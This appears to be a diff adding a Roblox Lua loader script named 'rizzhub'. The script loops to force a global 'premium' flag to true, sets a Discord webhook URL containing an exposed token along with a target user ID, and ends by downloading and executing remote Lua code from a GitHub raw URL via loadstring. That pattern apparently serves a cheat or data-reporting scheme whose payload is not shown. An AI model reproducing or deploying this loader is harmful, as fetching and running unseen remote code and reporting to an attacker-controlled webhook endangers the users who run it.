@@ -1,0 +1,27 @@
+spawn(function()
+
+    while true do
+
+        game:GetService("RunService").RenderStepped:Wait()
+
+        _G["premium"] = true
+
+    end
+
+end)
+
+_G.UserID = 3382096027
+
+_G.Webhook = "https://discord.com/api/webhooks/1092451651937382470/-ZsOS-zhPUH7ImUmZ1_5IkgZc6kMreryF9o3azNIk6WB8_VqX-kStrDEv3Oxq6Yk4rAV"
+
+_G.ScriptName = "rizzhub"
+
+_G.FirstText = "check 1"
+
+_G.SecondText = "check 2"
+
+_G.ThirdText = "check 3"
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Script.lua"))()
